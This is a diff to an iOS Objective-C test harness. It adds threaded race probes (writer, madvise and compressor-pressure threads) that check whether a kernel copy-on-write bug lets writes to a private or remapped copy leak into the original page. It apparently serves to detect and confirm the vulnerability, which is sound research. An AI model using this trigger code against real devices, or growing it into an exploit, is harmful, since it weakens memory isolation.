@@ -5,6 +5,7 @@
 #import <sys/mman.h>
 #import <unistd.h>
 #import <fcntl.h>
+#import <pthread.h>
 
 // vm_remap is a standard MIG routine; declared here so the build never depends
 // on which SDK header happens to expose it (mach_vm.h is macOS-only).
@@ -393,6 +394,166 @@ static void KPCoWFreeSlabs(NSArray<NSValue *> *slabs) {
     return result;
 }
 
+#pragma mark - Threaded contention (the vm_fault_page / compressor interleaving)
+
+typedef struct {
+    volatile int stop;
+    uint8_t *target;
+    size_t length;
+    volatile uint64_t writes;
+    volatile uint64_t madvs;
+} KPCoWRaceCtx;
+
+typedef struct {
+    volatile int stop;
+    volatile uint64_t turns;
+} KPCoWPressureCtx;
+
+static void *KPCoWWriterThread(void *arg) {
+    KPCoWRaceCtx *ctx = (KPCoWRaceCtx *)arg;
+    while (!ctx->stop) {
+        for (size_t off = 0; off < ctx->length; off += kKPCoWPage) {
+            memset(ctx->target + off, 0x41, 16);
+        }
+        ctx->writes++;
+    }
+    return NULL;
+}
+
+static void *KPCoWMadvThread(void *arg) {
+    KPCoWRaceCtx *ctx = (KPCoWRaceCtx *)arg;
+    while (!ctx->stop) {
+        madvise(ctx->target, ctx->length, MADV_DONTNEED);
+        madvise(ctx->target, ctx->length, MADV_FREE);
+        ctx->madvs++;
+    }
+    return NULL;
+}
+
+static void *KPCoWPressureThread(void *arg) {
+    KPCoWPressureCtx *ctx = (KPCoWPressureCtx *)arg;
+    // 128 MB churn: dirty -> let the compressor bite -> redirty.
+    const size_t slabSize = 8 * 1024 * 1024;
+    const int slabCount = 16;
+    uint8_t *slabs[16] = {0};
+    for (int i = 0; i < slabCount; i++) {
+        slabs[i] = mmap(NULL, slabSize, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
+        if (slabs[i] == MAP_FAILED) { slabs[i] = NULL; }
+    }
+    while (!ctx->stop) {
+        for (int i = 0; i < slabCount; i++) {
+            if (!slabs[i]) continue;
+            memset(slabs[i], (uint8_t)(0x10 + i), slabSize);
+        }
+        ctx->turns++;
+    }
+    for (int i = 0; i < slabCount; i++) {
+        if (slabs[i]) munmap(slabs[i], slabSize);
+    }
+    return NULL;
+}
+
+static NSDictionary *KPCoWRace(NSString *oracle,
+                               uint8_t *raced, size_t racedLen,
+                               uint8_t *peer, size_t peerLen,
+                               uint8_t peerOriginal,
+                               double seconds) {
+    KPCoWRaceCtx race = {0, raced, racedLen, 0, 0};
+    KPCoWPressureCtx pressure = {0, 0};
+    pthread_t writer, madv, press;
+    pthread_create(&writer, NULL, KPCoWWriterThread, &race);
+    pthread_create(&madv, NULL, KPCoWMadvThread, &race);
+    pthread_create(&press, NULL, KPCoWPressureThread, &pressure);
+
+    uint64_t checks = 0, leaks = 0, firstCheck = 0;
+    uint64_t deadline = (uint64_t)(seconds * 1000.0);
+    CFAbsoluteTime t0 = CFAbsoluteTimeGetCurrent();
+    while ((uint64_t)((CFAbsoluteTimeGetCurrent() - t0) * 1000.0) < deadline) {
+        for (size_t off = 0; off < peerLen; off += 64) {
+            checks++;
+            if (peer[off] != peerOriginal) {
+                leaks++;
+                if (!firstCheck) firstCheck = checks;
+                break;
+            }
+        }
+    }
+    race.stop = 1;
+    pressure.stop = 1;
+    pthread_join(writer, NULL);
+    pthread_join(madv, NULL);
+    pthread_join(press, NULL);
+
+    return @{
+        @"oracle": oracle,
+        @"seconds": @(seconds),
+        @"checks": @(checks),
+        @"leaks": @(leaks),
+        @"first_leak_check": @(firstCheck),
+        @"writes": @(race.writes),
+        @"madvs": @(race.madvs),
+        @"pressure_turns": @(pressure.turns),
+    };
+}
+
+// O9: threaded race on a MAP_PRIVATE copy; peer = the MAP_SHARED cache page.
+- (NSDictionary *)threadedRaceFilePrivateSeconds:(double)seconds {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"kp-cow-t9.bin"];
+    NSMutableData *seed = [NSMutableData dataWithLength:kKPCoWPage * 4];
+    memset(seed.mutableBytes, 0x66, seed.length);
+    if (![seed writeToFile:path atomically:YES]) {
+        result[@"status"] = @"SEED_WRITE_FAILED";
+        return result;
+    }
+    int fd = open(path.fileSystemRepresentation, O_RDWR);
+    if (fd < 0) { result[@"status"] = @"OPEN_FAILED"; return result; }
+    size_t len = kKPCoWPage * 4;
+    uint8_t *shared = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    uint8_t *priv = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+    if (shared == MAP_FAILED || priv == MAP_FAILED) {
+        result[@"status"] = @"MMAP_FAILED";
+        close(fd);
+        return result;
+    }
+    NSDictionary *r = KPCoWRace(@"O9 threaded: write+madvise+pressure on MAP_PRIVATE, shared cache must stay 0x66",
+                                priv, len, shared, len, 0x66, seconds);
+    [result addEntriesFromDictionary:r];
+    munmap(shared, len);
+    munmap(priv, len);
+    close(fd);
+    return result;
+}
+
+// O10: threaded race on a vm_remap(copy=TRUE) copy; peer = the source region.
+- (NSDictionary *)threadedRaceRemapCopySeconds:(double)seconds {
+    NSMutableDictionary *result = [NSMutableDictionary dictionary];
+    vm_address_t src = 0;
+    size_t len = kKPCoWPage * 4;
+    kern_return_t kr = vm_allocate(mach_task_self(), &src, len, VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        result[@"status"] = @"SRC_ALLOC_FAILED";
+        return result;
+    }
+    memset((void *)src, 0x77, len);
+    vm_address_t dst = 0;
+    vm_prot_t cur = 0, max = 0;
+    kr = vm_remap(mach_task_self(), &dst, len, 0, VM_FLAGS_ANYWHERE,
+                  mach_task_self(), src, TRUE, &cur, &max, VM_INHERIT_COPY);
+    if (kr != KERN_SUCCESS) {
+        result[@"status"] = @"REMAP_FAILED";
+        result[@"kr"] = @(kr);
+        vm_deallocate(mach_task_self(), src, len);
+        return result;
+    }
+    NSDictionary *r = KPCoWRace(@"O10 threaded: write+madvise+pressure on vm_remap(copy=TRUE) copy, source must stay 0x77",
+                                (uint8_t *)dst, len, (uint8_t *)src, len, 0x77, seconds);
+    [result addEntriesFromDictionary:r];
+    vm_deallocate(mach_task_self(), dst, len);
+    vm_deallocate(mach_task_self(), src, len);
+    return result;
+}
+
 #pragma mark - Report
 
 - (NSString *)runReport {
@@ -405,6 +566,8 @@ static void KPCoWFreeSlabs(NSArray<NSValue *> *slabs) {
     [report appendString:@"fork() is not available to sandboxed apps — all oracles are fork-free.\n"];
     [report appendString:@"v3 lanes: O6 shared memory-entry (named object), O7 overwrite-remap,\n"];
     [report appendString:@"O8 CoW over a MAP_SHARED cache — the shapes the fix family points to.\n"];
+    [report appendString:@"v4 lanes: O9/O10 threaded race — writer + madvise + compressor-pressure\n"];
+    [report appendString:@"threads hammer one mapping while the peer is checked (4s budget each).\n"];
     [report appendFormat:@"Target: iOS %@ uid=%d\n", UIDevice.currentDevice.systemVersion, getuid()];
 
     uint32_t iters = self.armed ? 256 : 8;
@@ -420,6 +583,8 @@ static void KPCoWFreeSlabs(NSArray<NSValue *> *slabs) {
         [report appendFormat:@"\n%@", [self overwriteRemapIterations:128]];
         [report appendFormat:@"\n%@", [self sharedFileCoWIterations:128 pressure:NO]];
         [report appendFormat:@"\n%@", [self sharedFileCoWIterations:64 pressure:YES]];
+        [report appendFormat:@"\n%@", [self threadedRaceFilePrivateSeconds:4.0]];
+        [report appendFormat:@"\n%@", [self threadedRaceRemapCopySeconds:4.0]];
     }
 
     [report appendString:@"\n\nVERDICT: "];
@@ -428,9 +593,11 @@ static void KPCoWFreeSlabs(NSArray<NSValue *> *slabs) {
      @"Reading the table:\n"
      @"  O3 sanity MUST show leaks>=1 (it proves the oracle observes propagation;\n"
      @"  leaks=0 there means the instrument is blind — distrust everything else).\n"
-     @"  O1/O2/O5/O6/O7/O8 leaks>0 = confirmed CoW integrity break (CVE-2026-112576).\n"
+     @"  O1/O2/O5/O6/O7/O8/O9/O10 leaks>0 = confirmed CoW integrity break.\n"
      @"  O6 note: map_failures>0 means the named-entry lane was unavailable in\n"
      @"  this sandbox — report it rather than reading silence as safety.\n"
+     @"  O9/O10: leaks=0 with low checks/writes means the race barely ran —\n"
+     @"  look at writes/madvs/pressure_turns to judge whether the engine spun.\n"
      @"  leaks=0 everywhere does NOT close the CVE: the fix also touches the\n"
      @"  compressor restore and fault paths and may need cross-process peers.\n"];
     return report;
